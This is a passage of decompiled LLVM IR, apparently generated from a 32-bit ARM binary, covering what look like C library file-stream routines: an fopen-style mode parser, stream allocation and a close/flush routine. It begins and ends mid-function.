  uselistorder i32 %v1_166c8, { 2, 0, 1 }
  uselistorder i32 %v0_166b0, { 1, 0 }
  uselistorder i32 %v1_166a0, { 0, 2, 1 }
  uselistorder i1 %v2_167d0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1662c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_16620, { 2, 1, 0 }
  uselistorder i32 %v3_16608, { 1, 0 }
  uselistorder i32 %v3_16604, { 2, 1, 0 }
  uselistorder i32 %v1_165fc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 33, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @function_145dc, { 0, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 92, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @function_17b90, { 1, 0 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 12, 13, 14, 38, 0, 39, 40, 15, 16, 92, 93, 94, 95, 96, 97, 105, 106, 107, 1, 108, 109, 110, 111, 112, 113, 115, 2, 114, 117, 116, 118, 119, 120, 121, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 98, 99, 100, 101, 34, 35, 36, 28, 29, 30, 31, 32, 33, 3, 37, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 7, 82, 83, 84, 4, 85, 86, 87, 88, 5, 89, 90, 91, 102, 103, 104, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 174, 171, 172, 173, 175, 176, 177, 178, 179, 181, 182, 180, 6, 183, 184, 185, 186, 187 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_168f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_168e0, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_168c0, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16874, { 1, 0 }
  uselistorder label %dec_label_pc_16644.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_167ec, { 1, 0 }
  uselistorder label %dec_label_pc_167ac, { 1, 0 }
  uselistorder label %dec_label_pc_167a0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16764, { 1, 0 }
  uselistorder label %dec_label_pc_16698, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_16908(i32* %arg1) local_unnamed_addr {
dec_label_pc_16908:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1690c = icmp eq i32* %arg1, null
  br i1 %v2_1690c, label %dec_label_pc_16934, label %dec_label_pc_16914

dec_label_pc_16914:                               ; preds = %dec_label_pc_16908
  %v2_16914 = load i32, i32* %arg1, align 4
  %v1_16918 = inttoptr i32 %v2_16914 to i16*
  %v2_16918 = call i32 @function_16984(i16* %v1_16918)
  %v0_1691c = load i32, i32* @r4, align 4
  %v1_1691c = add i32 %v0_1691c, 20
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  %v2_16920 = icmp eq i32 %v3_1691c, 0
  br i1 %v2_16920, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_16914
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_16914, %bb
  store i32 92460, i32* @lr, align 4
  %v1_16928 = xor i1 %v2_16920, true
  call void @__pseudo_cond_branch(i1 %v1_16928, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_1692c = load i32, i32* @r4, align 4
  store i32 %v0_1692c, i32* @r0, align 4
  %v0_16930 = call i32 @function_14bf4()
  br label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_16908, %bb6
  %v1_16938 = phi i32 [ 0, %dec_label_pc_16908 ], [ %v0_16930, %bb6 ]
  ret i32 %v1_16938

; uselistorder directives
  uselistorder i32* null, { 0, 4, 5, 1, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 19, 20, 21, 3, 22, 25, 23, 24, 38, 26, 8, 27, 28, 29, 30, 31, 32, 33, 34, 35, 7, 36, 37 }
  uselistorder label %dec_label_pc_16934, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_1693c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1693c:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16948 = load i32, i32* @r4, align 4
  store i32 %v3_16948, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1879c.681 to i32), i32* @r1, align 4
  %v0_16950 = call i32 @function_16b38()
  store i32 %v0_16950, i32* %r0.global-to-local, align 4
  store i32 %v0_16950, i32* @r4, align 4
  %v2_16954 = icmp eq i32 %v0_16950, 0
  br i1 %v2_16954, label %bb, label %dec_label_pc_16960

bb:                                               ; preds = %dec_label_pc_1693c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16960:                               ; preds = %dec_label_pc_1693c
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16968 = call i32 @function_144a8(i32 1, i32 24)
  store i32 %v2_16968, i32* %r0.global-to-local, align 4
  %v2_1696c = icmp eq i32 %v2_16968, 0
  br i1 %v2_1696c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_16960
  %v1_16970 = load i32, i32* @r4, align 4
  %v3_16970 = inttoptr i32 %v2_16968 to i32*
  store i32 %v1_16970, i32* %v3_16970, align 4
  %v1_16978.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_16960, %bb4
  %v1_16978 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_16960 ], [ %v1_16978.pre, %bb4 ]
  %v2_16974 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16974, i32* @r4, align 4
  ret i32 %v1_16978

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_144a8, { 36, 34, 5, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 1, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_16984(i16* %arg1) local_unnamed_addr {
dec_label_pc_16984:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16984 = load i32, i32* @r4, align 4
  store i32 %v3_16984, i32* %stack_var_-36, align 4
  %v6_16984 = load i32, i32* @r5, align 4
  %v9_16984 = load i32, i32* @r6, align 4
  %v12_16984 = load i32, i32* @r7, align 4
  %v2_16988 = add i32 %tmp, 52
  %v3_16988 = inttoptr i32 %v2_16988 to i32*
  %v4_16988 = load i32, i32* %v3_16988, align 4
  %v1_16990 = sub i32 1, %v4_16988
  %v2_16990 = icmp ult i32 %v4_16988, 2
  br i1 %v2_16990, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16984
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16984, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_16990, %dec_label_pc_16984 ]
  %v0_16998 = phi i32 [ 0, %bb ], [ %v1_16990, %dec_label_pc_16984 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_16998 = icmp eq i32 %v0_16998, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 135344, i32* @r6, align 4
  br i1 %v2_16998, label %dec_label_pc_169e4, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %bb18
  %v4_169c4 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_169c4)
  %v0_169d8 = load i32, i32* @r6, align 4
  %v2_169d8 = add i32 %v0_169d8, 16
  %v3_169d8 = inttoptr i32 %v2_169d8 to i32*
  %v4_169d8 = load i32, i32* %v3_169d8, align 4
  call void @__pseudo_branch(i32 %v4_169d8)
  %v0_169e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %bb18, %dec_label_pc_169ac
  %v1_169ec = phi i32 [ %tmp, %bb18 ], [ %v0_169e4.pre, %dec_label_pc_169ac ]
  %v1_169e4 = inttoptr i32 %v1_169ec to i16*
  %v2_169e4 = load i16, i16* %v1_169e4, align 2
  %v3_169e4 = zext i16 %v2_169e4 to i32
  %v1_169e8 = and i32 %v3_169e4, 64
  %v2_169e8 = icmp eq i32 %v1_169e8, 0
  br i1 %v2_169e8, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_169e4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_169e4, %bb19
  %storemerge26 = phi i32 [ %v1_169ec, %bb19 ], [ %v1_169e8, %dec_label_pc_169e4 ]
  %v1_169f0 = xor i1 %v2_169e8, true
  call void @__pseudo_cond_branch(i1 %v1_169f0, i32 ptrtoint (i32* @global_var_17320.686 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_169f8 = load i32, i32* @r5, align 4
  %v1_169f8 = add i32 %v0_169f8, 4
  %v2_169f8 = inttoptr i32 %v1_169f8 to i32*
  %v3_169f8 = load i32, i32* %v2_169f8, align 4
  %v1_169fc = call i32 @function_1314c(i32 %v3_169f8)
  %v0_16a04 = load i32, i32* @r6, align 4
  %v2_16a10 = add i32 %v0_16a04, 108
  %v3_16a10 = inttoptr i32 %v2_16a10 to i32*
  %v4_16a10 = load i32, i32* %v3_16a10, align 4
  store i32 %v4_16a10, i32* @r7, align 4
  %v1_16a18 = load i32, i32* @r5, align 4
  %v2_16a18 = add i32 %v1_16a18, 4
  %v3_16a18 = inttoptr i32 %v2_16a18 to i32*
  store i32 -1, i32* %v3_16a18, align 4
  %v0_16a20 = load i32, i32* @r6, align 4
  %v2_16a20 = add i32 %v0_16a20, 72
  %v3_16a20 = inttoptr i32 %v2_16a20 to i32*
  %v4_16a20 = load i32, i32* %v3_16a20, align 4
  %v1_16a28 = icmp slt i32 %v1_169fc, 0
  store i32 %v4_16a20, i32* %stack_var_-80, align 4
  br i1 %v1_16a28, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_16a20)
  %v0_16a50 = load i32, i32* @r6, align 4
  %v2_16a50 = add i32 %v0_16a50, 16
  %v3_16a50 = inttoptr i32 %v2_16a50 to i32*
  %v4_16a50 = load i32, i32* %v3_16a50, align 4
  call void @__pseudo_branch(i32 %v4_16a50)
  %v0_16a60 = load i32, i32* @r6, align 4
  %v2_16a60 = add i32 %v0_16a60, 12
  %v3_16a60 = inttoptr i32 %v2_16a60 to i32*
  %v4_16a60 = load i32, i32* %v3_16a60, align 4
  %v1_16a64 = inttoptr i32 %v4_16a60 to i32*
  %v2_16a64 = load i32, i32* %v1_16a64, align 4
  %v1_16a6c = add i32 %v2_16a64, 1
  %v2_16a70 = add i32 %v0_16a60, 24
  %v3_16a70 = inttoptr i32 %v2_16a70 to i32*
  %v4_16a70 = load i32, i32* %v3_16a70, align 4
  store i32 %v4_16a70, i32* @r4, align 4
  store i32 %v1_16a6c, i32* %v1_16a64, align 4
  call void @__pseudo_branch(i32 %v4_16a70)
  %v0_16a88 = load i32, i32* @r5, align 4
  %v1_16a88 = inttoptr i32 %v0_16a88 to i16*
  %v2_16a88 = load i16, i16* %v1_16a88, align 2
  %v1_16a8c = and i16 %v2_16a88, 24576
  %v1_16a90 = or i16 %v1_16a8c, 48
  %v0_16a94 = load i32, i32* %sb.global-to-local, align 4
  %v2_16a94 = icmp eq i32 %v0_16a94, 0
  store i16 %v1_16a90, i16* %v1_16a88, align 2
  br i1 %v2_16a94, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_16aa8 = xor i1 %v2_16a94, true
  call void @__pseudo_cond_branch(i1 %v2_16aa8, i32 %v4_16a70)
  %v0_16aac = load i32, i32* @r5, align 4
  %v1_16aac = inttoptr i32 %v0_16aac to i16*
  %v2_16aac = load i16, i16* %v1_16aac, align 2
  %v1_16ab0 = and i16 %v2_16aac, 16384
  %v2_16ab0 = icmp eq i16 %v1_16ab0, 0
  br i1 %v2_16ab0, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_16ab8 = xor i1 %v2_16ab0, true
  call void @__pseudo_cond_branch(i1 %v1_16ab8, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v2_16ac4 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_16ac4)
  call void @__pseudo_branch(i32 %v4_16a50)
  %v0_16ae4 = load i32, i32* @r6, align 4
  %v2_16ae4 = add i32 %v0_16ae4, 48
  %v3_16ae4 = inttoptr i32 %v2_16ae4 to i32*
  %v4_16ae4 = load i32, i32* %v3_16ae4, align 4
  %v1_16ae8 = inttoptr i32 %v4_16ae4 to i32*
  %v2_16ae8 = load i32, i32* %v1_16ae8, align 4
  %v1_16aec = add i32 %v2_16ae8, 1
  store i32 %v1_16aec, i32* %v1_16ae8, align 4
  call void @__pseudo_branch(i32 %v4_16a70)
  %v0_16b04 = call i32 @function_17198()
  %v0_16b08 = load i32, i32* %sl.global-to-local, align 4
  %v2_16b10 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16b10, i32* @r4, align 4
  store i32 %v6_16984, i32* @r5, align 4
  store i32 %v9_16984, i32* @r6, align 4
  store i32 %v12_16984, i32* @r7, align 4
  ret i32 %v0_16b08

; uselistorder directives
  uselistorder i1 %v2_16ab0, { 1, 0 }
  uselistorder i32 %v4_16a70, { 0, 2, 1, 3 }
  uselistorder i32 %v4_16988, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_1314c, { 33, 7, 32, 31, 11, 30, 29, 10, 9, 8, 27, 28, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 2, 6, 5, 4, 3, 0, 1 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_169e4, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_16b1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_16b1c:
  %v0_16b1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16b1c, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_16b1c
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_16b1c, %bb
  %v10_16b34 = phi i32 [ %arg1, %dec_label_pc_16b1c ], [ 0, %bb ]
  ret i32 %v10_16b34

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_16b38() local_unnamed_addr {
dec_label_pc_16b38:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16b48 = call i32 @function_16b58()
  ret i32 %v0_16b48
}

define i32 @function_16b58() local_unnamed_addr {
dec_label_pc_16b58:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16b58 = load i32, i32* @r4, align 4
  store i32 %v3_16b58, i32* %stack_var_-36, align 4
  %v6_16b58 = load i32, i32* @r5, align 4
  %v9_16b58 = load i32, i32* @r6, align 4
  %v18_16b58 = load i32, i32* @sb, align 4
  %v24_16b58 = load i32, i32* @fp, align 4
  %v0_16b5c = load i32, i32* @r1, align 4
  %v1_16b5c = inttoptr i32 %v0_16b5c to i8*
  %v2_16b5c = load i8, i8* %v1_16b5c, align 1
  %v3_16b5c = zext i8 %v2_16b5c to i32
  store i32 %v3_16b5c, i32* @ip, align 4
  %v7_16b64 = icmp eq i8 %v2_16b5c, 114
  store i32 135344, i32* @fp, align 4
  %v2_16b6c = ptrtoint i32* %stack_var_-72 to i32
  %v0_16b70 = load i32, i32* @r0, align 4
  store i32 %v0_16b70, i32* @r6, align 4
  %v0_16b74 = load i32, i32* @r2, align 4
  store i32 %v0_16b74, i32* @sb, align 4
  %v0_16b78 = load i32, i32* @r3, align 4
  store i32 %v0_16b78, i32* @r5, align 4
  br i1 %v7_16b64, label %dec_label_pc_16bc4, label %dec_label_pc_16b80

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b58
  %v7_16b80 = icmp eq i8 %v2_16b5c, 119
  br i1 %v7_16b80, label %bb, label %dec_label_pc_16b8c

bb:                                               ; preds = %dec_label_pc_16b80
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_16bc8

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b80
  %v7_16b8c = icmp eq i8 %v2_16b5c, 97
  br i1 %v7_16b8c, label %bb32, label %dec_label_pc_16b98

bb32:                                             ; preds = %dec_label_pc_16b8c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_16bc8

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b8c, %dec_label_pc_16c4c, %dec_label_pc_16c20
  %v0_16b98 = call i32 @function_13574()
  store i32 %v0_16b98, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_16ba0 = load i32, i32* @sb, align 4
  %v2_16ba0 = icmp eq i32 %v0_16ba0, 0
  %v2_16ba4 = inttoptr i32 %v0_16b98 to i32*
  store i32 22, i32* %v2_16ba4, align 4
  br i1 %v2_16ba0, label %dec_label_pc_16e18, label %dec_label_pc_16bac

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16c70._crit_edge, %dec_label_pc_16b98
  %v0_16bac = load i32, i32* @sb, align 4
  %v1_16bac = inttoptr i32 %v0_16bac to i16*
  %v2_16bac = load i16, i16* %v1_16bac, align 2
  %v3_16bac = zext i16 %v2_16bac to i32
  store i32 %v3_16bac, i32* %r3.global-to-local, align 4
  %v1_16bb0 = and i32 %v3_16bac, 8192
  %v2_16bb0 = icmp eq i32 %v1_16bb0, 0
  br i1 %v2_16bb0, label %dec_label_pc_16e18, label %dec_label_pc_16bb8

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16bac
  store i32 %v0_16bac, i32* @r0, align 4
  %v0_16bbc = call i32 @function_14bf4()
  store i32 %v0_16bbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16e18

dec_label_pc_16bc4:                               ; preds = %dec_label_pc_16b58
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %bb, %bb32, %dec_label_pc_16bc4
  %v1_16be0 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_16bc4 ]
  %v1_16bc8 = add i32 %v0_16b5c, 1
  %v2_16bc8 = inttoptr i32 %v1_16bc8 to i8*
  %v3_16bc8 = load i8, i8* %v2_16bc8, align 1
  %v7_16bcc = icmp eq i8 %v3_16bc8, 98
  %v1_16bc8.v0_16b5c = select i1 %v7_16bcc, i32 %v1_16bc8, i32 %v0_16b5c
  store i32 %v1_16bc8.v0_16b5c, i32* %r3.global-to-local, align 4
  %v1_16bd8 = add i32 %v1_16bc8.v0_16b5c, 1
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i8*
  %v3_16bd8 = load i8, i8* %v2_16bd8, align 1
  %v4_16bd8 = zext i8 %v3_16bd8 to i32
  store i32 %v4_16bd8, i32* @r3, align 4
  %v7_16bdc = icmp eq i8 %v3_16bd8, 43
  br i1 %v7_16bdc, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_16bc8
  store i32 %v1_16be0, i32* @r3, align 4
  %v2_16be4 = add nuw nsw i32 %v1_16be0, 1
  store i32 %v2_16be4, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16bc8, %bb35
  %v2_16be8 = icmp eq i32 %v0_16b74, 0
  br i1 %v2_16be8, label %dec_label_pc_16bf0, label %dec_label_pc_16c18

dec_label_pc_16bf0:                               ; preds = %.thread3
  store i32 80, i32* @r0, align 4
  %v0_16bf4 = call i32 @function_13b88()
  store i32 %v0_16bf4, i32* %r0.global-to-local, align 4
  store i32 %v0_16bf4, i32* @sb, align 4
  %v3_16bf8 = icmp eq i32 %v0_16bf4, 0
  br i1 %v3_16bf8, label %dec_label_pc_16e1c, label %dec_label_pc_16c00

dec_label_pc_16c00:                               ; preds = %dec_label_pc_16bf0
  %v2_16c04 = add i32 %v0_16bf4, 8
  %v3_16c04 = inttoptr i32 %v2_16c04 to i32*
  store i32 0, i32* %v3_16c04, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_16c0c = load i32, i32* @sb, align 4
  %v3_16c0c = inttoptr i32 %v2_16c0c to i16*
  store i16 8192, i16* %v3_16c0c, align 2
  %v0_16c10 = load i32, i32* @sb, align 4
  %v1_16c10 = add i32 %v0_16c10, 56
  store i32 %v1_16c10, i32* @r0, align 4
  %v1_16c14 = call i32 @function_16ec8(i32 %v1_16c10)
  store i32 %v1_16c14, i32* %r0.global-to-local, align 4
  %v0_16c18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %.thread3, %dec_label_pc_16c00
  %v0_16c70 = phi i32 [ %v0_16b78, %.thread3 ], [ %v0_16c18.pre, %dec_label_pc_16c00 ]
  %v1_16c18 = icmp slt i32 %v0_16c70, 0
  br i1 %v1_16c18, label %dec_label_pc_16c70, label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c18
  %v0_16c24 = load i32, i32* @r4, align 4
  %v2_16c24 = and i32 %v0_16c24, 131075
  %v1_16c28 = add nuw nsw i32 %v2_16c24, 1
  store i32 %v1_16c28, i32* %r2.global-to-local, align 4
  %v0_16c2c = load i32, i32* @r6, align 4
  %v1_16c2c = add i32 %v0_16c2c, 1
  %v2_16c30 = and i32 %v1_16c2c, %v1_16c28
  store i32 %v2_16c30, i32* %r3.global-to-local, align 4
  %v9_16c34 = icmp eq i32 %v2_16c30, %v1_16c28
  %v1_16c38 = load i32, i32* @sb, align 4
  %v2_16c38 = add i32 %v1_16c38, 4
  %v3_16c38 = inttoptr i32 %v2_16c38 to i32*
  store i32 %v0_16c70, i32* %v3_16c38, align 4
  br i1 %v9_16c34, label %dec_label_pc_16c40, label %dec_label_pc_16b98

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16c20
  %v0_16c40 = load i32, i32* @r4, align 4
  %v1_16c40 = load i32, i32* @r6, align 4
  %v2_16c40 = sub i32 -1, %v1_16c40
  %v3_16c40 = and i32 %v0_16c40, %v2_16c40
  store i32 %v3_16c40, i32* @r3, align 4
  %v1_16c44 = and i32 %v3_16c40, 1024
  %v2_16c44 = icmp eq i32 %v1_16c44, 0
  br i1 %v2_16c44, label %dec_label_pc_16c64, label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c40
  %v0_16c4c = load i32, i32* @r5, align 4
  store i32 %v0_16c4c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_16c58 = call i32 @function_12f80(i32 %v0_16c4c, i32 4)
  store i32 %v2_16c58, i32* %r0.global-to-local, align 4
  %v2_16c5c = icmp eq i32 %v2_16c58, 0
  br i1 %v2_16c5c, label %dec_label_pc_16c4c.dec_label_pc_16c64_crit_edge, label %dec_label_pc_16b98

dec_label_pc_16c4c.dec_label_pc_16c64_crit_edge:  ; preds = %dec_label_pc_16c4c
  %v0_16c64.pre = load i32, i32* @r6, align 4
  %v0_16c68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16c64

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c4c.dec_label_pc_16c64_crit_edge, %dec_label_pc_16c40
  %v0_16c68 = phi i32 [ %v0_16c68.pre, %dec_label_pc_16c4c.dec_label_pc_16c64_crit_edge ], [ %v0_16c40, %dec_label_pc_16c40 ]
  %v0_16c64 = phi i32 [ %v0_16c64.pre, %dec_label_pc_16c4c.dec_label_pc_16c64_crit_edge ], [ %v1_16c40, %dec_label_pc_16c40 ]
  %v1_16c64 = and i32 %v0_16c64, 131072
  store i32 %v1_16c64, i32* %r3.global-to-local, align 4
  %v2_16c68 = or i32 %v1_16c64, %v0_16c68
  store i32 %v2_16c68, i32* @r4, align 4
  br label %dec_label_pc_16c94

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c18
  %v7_16c70 = icmp eq i32 %v0_16c70, -1
  %v0_16c7c.pre = load i32, i32* @r4, align 4
  br i1 %v7_16c70, label %dec_label_pc_16c70._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_16c70
  %v2_16c74 = or i32 %v0_16c7c.pre, 131072
  store i32 %v2_16c74, i32* @r4, align 4
  br label %dec_label_pc_16c70._crit_edge

dec_label_pc_16c70._crit_edge:                    ; preds = %dec_label_pc_16c70, %bb36
  %v0_16c7c = phi i32 [ %v2_16c74, %bb36 ], [ %v0_16c7c.pre, %dec_label_pc_16c70 ]
  %v0_16c78 = load i32, i32* @r6, align 4
  store i32 %v0_16c78, i32* %r0.global-to-local, align 4
  store i32 %v0_16c7c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_16c84 = call i32 @function_12d24(i32 %v0_16c78, i32 %v0_16c7c)
  store i32 %v2_16c84, i32* %r0.global-to-local, align 4
  %v1_16c88 = icmp slt i32 %v2_16c84, 0
  %v1_16c8c = load i32, i32* @sb, align 4
  %v2_16c8c = add i32 %v1_16c8c, 4
  %v3_16c8c = inttoptr i32 %v2_16c8c to i32*
  store i32 %v2_16c84, i32* %v3_16c8c, align 4
  br i1 %v1_16c88, label %dec_label_pc_16bac, label %.dec_label_pc_16c94_crit_edge

.dec_label_pc_16c94_crit_edge:                    ; preds = %dec_label_pc_16c70._crit_edge
  %v0_16c98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16c94

dec_label_pc_16c94:                               ; preds = %.dec_label_pc_16c94_crit_edge, %dec_label_pc_16c64
  %v0_16cb0 = phi i32 [ %v0_16c98.pre, %.dec_label_pc_16c94_crit_edge ], [ %v2_16c68, %dec_label_pc_16c64 ]
  %v0_16c94 = load i32, i32* @sb, align 4
  %v1_16c94 = inttoptr i32 %v0_16c94 to i16*
  %v2_16c94 = load i16, i16* %v1_16c94, align 2
  %v3_16c94 = zext i16 %v2_16c94 to i32
  %v1_16c98 = urem i32 %v0_16cb0, 4
  %v1_16c9c = and i32 %v0_16cb0, 1024
  %v1_16ca0 = and i32 %v3_16c94, 8192
  %v1_16ca4 = add nuw nsw i32 %v1_16c98, 1
  %v2_16ca8 = or i32 %v1_16ca0, %v1_16c9c
  store i32 %v2_16ca8, i32* %r3.global-to-local, align 4
  %v1_16cac = xor i32 %v1_16ca4, 3
  store i32 %v1_16cac, i32* %r1.global-to-local, align 4
  %v1_16cb0 = and i32 %v0_16cb0, 131072
  store i32 %v1_16cb0, i32* %r2.global-to-local, align 4
  %v2_16cb0 = icmp eq i32 %v1_16cb0, 0
  %v1_16cb4 = add i32 %v0_16c94, 4
  %v2_16cb4 = inttoptr i32 %v1_16cb4 to i32*
  %v3_16cb4 = load i32, i32* %v2_16cb4, align 4
  store i32 %v3_16cb4, i32* @r5, align 4
  br i1 %v2_16cb0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_16c94
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_16c94, %bb37
  %v0_16cc0 = phi i32 [ 0, %dec_label_pc_16c94 ], [ 32768, %bb37 ]
  %v4_16cbc = mul nuw nsw i32 %v1_16cac, 16
  %v5_16cbc = or i32 %v2_16ca8, %v4_16cbc
